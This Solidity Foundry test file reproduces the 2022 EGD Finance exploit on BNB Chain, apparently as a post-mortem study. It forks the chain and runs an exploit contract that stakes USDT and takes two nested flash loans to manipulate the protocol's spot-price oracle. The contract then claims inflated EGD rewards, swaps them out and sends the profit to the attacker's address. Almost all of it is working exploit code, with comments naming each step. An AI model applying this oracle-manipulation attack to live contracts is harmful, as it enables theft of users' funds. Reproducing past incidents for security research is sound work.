// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "forge-std/StdCheats.sol";

//  @KeyInfo - Total Lost : ~36,044 US$
//   blockNumber: 20245540
//   Attack Tx: https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3
//   Attacker Address(EOA): 0xee0221d76504aec40f63ad7e36855eebf5ea5edd
//   Attack Contract Address: 0xc30808d9373093fbfcec9e026457c6a9dab706a7
//   Vulnerable Address: 0x34bd6dba456bc31c2b3393e499fa10bed32a9370 (proxy)
//   Vulnerable Address: 0x93c175439726797dcee24d08e4ac9164e88e7aee (logic)
//   Total Loss: 36,044,121156865234135946 BSC-USD

//   @Analysis
//   Blocksec : https://twitter.com/BlockSecTeam/status/1556483435388350464

//   分析攻击需要的变量
IPancakePair constant USDT_WBNB_LPPool = IPancakePair(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE);
IPancakePair constant EGD_USDT_LPPool = IPancakePair(0xa361433E409Adac1f87CDF133127585F8a93c67d);
IPancakeRouter constant pancakeRouter = IPancakeRouter(payable(0x10ED43C718714eb63d5aA57B78B54704E256024E));
address constant EGD_Finance = 0x34Bd6Dba456Bc31c2b3393e499fa10bED32a9370;
address constant usdt = 0x55d398326f99059fF775485246999027B3197955;
address constant egd = 0x202b233735bF743FA31abb8f71e641970161bF98;

event log_named_decimal_uint(string name, uint256 balance, uint256 decimal);


contract ContractTest is Test { // 模拟攻击
    
    function setUp() public {
        vm.createSelectFork("bsc", 20_245_522);

        vm.label(address(USDT_WBNB_LPPool), "USDT_WBNB_LPPool");
        vm.label(address(EGD_USDT_LPPool), "EGD_USDT_LPPool");
        vm.label(address(pancakeRouter), "pancakeRouter");
        vm.label(EGD_Finance, "EGD_Finance");
        vm.label(usdt, "USDT");
        vm.label(egd, "EGD");
    }
       
    function testExploit() public {
        console.log("--------------------  Pre-work, stake 100 USDT to EGD Finance --------------------");
        console.log("Tx: 0x4a66d01a017158ff38d6a88db98ba78435c606be57ca6df36033db4d9514f9f8");
        console.log("Attacker Stake 100 USDT to EGD Finance");

        Exploit exploit = new Exploit();

        deal(address(usdt), address(exploit), 100 ether);
        
        exploit.stake();
        vm.warp(1_659_914_146); // block.timestamp = 2022-08-07 23:15:46(UTC)

         console.log("-------------------------------- Start Exploit ----------------------------------");

        // 根据palcon来跟踪信息
        emit log_named_decimal_uint("[Start] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
        emit log_named_decimal_uint("[INFO] EGD/USDT Price before price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18);
        emit log_named_decimal_uint("[INFO] Current earned reward (EGD token)", IEGD_Finance(EGD_Finance).calculateAll(address(exploit)), 18);
        
        console.log("Attacker manipulating price oracle of EGD Finance...");
        
        exploit.harvest(); //模拟攻击

        console.log("-------------------------------- End Exploit ----------------------------------");
        emit log_named_decimal_uint("[End] Attacker USDT Balance", IERC20(usdt).balanceOf(address(this)), 18);
    }
    
}

contract Exploit {
    address recipient = 0xee0221D76504Aec40f63ad7e36855EEbF5eA5EDd;

    function stake() public {
        console.log("Attacker staking 100 USDT...");
        // Set invitor
        IEGD_Finance(EGD_Finance).bond(address(0x659b136c49Da3D9ac48682D02F7BD8806184e218));
        // Stake 100 USDT
        IERC20(usdt).approve(EGD_Finance, 100 ether);
        IEGD_Finance(EGD_Finance).stake(100 ether);
    }

    function harvest() external {
        // uint256 amountUSDTBefore = IERC20(usdt).balanceOf(address(this));
        // 攻击逻辑
        IEGD_Finance(EGD_Finance).calculateAll(address(this));
        // 攻击合约首先查询 LP 合约存放的EGD、BSC-USD数量和代理合约的EGD数量
        uint256 amountEGDCakeLP = IERC20(egd).balanceOf(address(EGD_USDT_LPPool));
        uint256 amountUSDTCakeLP = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool));

        // 向 USDT_WBNB_LPPool 借出2000 BSC-USD
        console.log("Flashloan[1] : borrow 2,000 USDT from USDT/WBNB LPPool reserve");
        USDT_WBNB_LPPool.swap(2000 * 1e18, 0, address(this), "0000");
        console.log("Flashloan[1] payback success");

        // 套利
        uint256 amountUSDTAfter = IERC20(usdt).balanceOf(address(this));
        IERC20(usdt).transfer(recipient, amountUSDTAfter);
    }

    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        if( keccak256(data) == keccak256("0000") ){
            console.log("Flashloan[1] received");
            console.log("Flashloan[2] : borrow 99.99999925% USDT of EGD/USDT LPPool reserve");
            uint256 borrow2 = IERC20(usdt).balanceOf(address(EGD_USDT_LPPool)) * 9_999_999_925 / 10_000_000_000; // Attacker borrows 99.99999925% USDT of EGD_USDT_LPPool reserve
            EGD_USDT_LPPool.swap(0, borrow2, address(this), "00");
            
            uint256 amountEGD = IERC20(egd).balanceOf(address(this));
            address[] memory path = new address[](2);
            (path[0], path[1]) = (egd,usdt);

            // 将自己手中的EDG全部用来交换BSC-USD
            console.log("Swap the profit...");
            IERC20(egd).approve(address(pancakeRouter), type(uint256).max);
            pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountEGD, 1, path, address(this), block.timestamp);
            
            // 还款1
            bool success = IERC20(usdt).transfer(address(USDT_WBNB_LPPool), 2010 ether);
            require(success, "Flashloan[1] payback failed");

        } else if( keccak256(data) == keccak256("00")){
            console.log("Flashloan[2] received");
            emit log_named_decimal_uint(
                "[INFO] EGD/USDT Price after price manipulation", IEGD_Finance(EGD_Finance).getEGDPrice(), 18
            );

            // 漏洞
            console.log("Claim all EGD Token reward from EGD Finance contract");
            IEGD_Finance(EGD_Finance).claimAllReward();
             emit log_named_decimal_uint("[INFO] Get reward (EGD token)", IERC20(egd).balanceOf(address(this)), 18);
            
            // 还款2
            uint256 fee = (amount1 * 10000 / 9970) - amount1;
            bool success = IERC20(usdt).transfer(address(EGD_USDT_LPPool), fee + amount1);
            require(success, "Flashloan[2] payback failed");
        }
    }
}

// 根据palcon来写接口，internal的函数并不会显示
/* -------------------- Interface -------------------- */
interface IEGD_Finance {
    function calculateAll(address addr) external view returns (uint);
    function claimAllReward() external;
    function getEGDPrice() external view returns (uint);
    function bond(address invitor) external;
    function stake(uint amount) external;
    
}
interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
}
interface IPancakePair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}
interface IPancakeRouter {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}